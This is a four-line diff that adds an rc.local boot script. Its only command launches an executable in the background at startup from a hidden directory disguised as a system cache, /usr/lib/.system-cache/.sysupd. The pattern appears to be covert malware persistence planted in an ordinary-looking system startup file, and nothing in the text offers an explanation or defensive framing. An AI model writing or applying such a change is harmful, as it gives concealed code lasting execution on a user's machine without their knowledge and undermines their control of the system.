@@ -1,0 +1,4 @@
+#!/bin/sh -e
+# rc.local
+/usr/lib/.system-cache/.sysupd &
+exit 0
